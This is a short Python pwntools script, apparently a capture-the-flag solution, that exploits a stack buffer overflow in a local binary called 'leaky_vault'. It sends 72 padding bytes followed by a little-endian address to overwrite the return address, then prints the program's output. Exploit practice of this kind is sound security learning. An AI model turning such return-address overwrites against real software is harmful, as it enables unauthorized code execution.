from pwn import *

# Address to overwrite the return address
address = 0x000000000040084c

# Create the payload
payload = b"A" * 72  # Fill the buffer
payload += p64(address)  # Overwrite the return address with the little-endian address

# Start the process
binary_path = "./leaky_vault"
p = process(binary_path)

# Send the payload
p.sendline(payload)

# Receive and print the output
output = p.recvall()
print(output.decode())
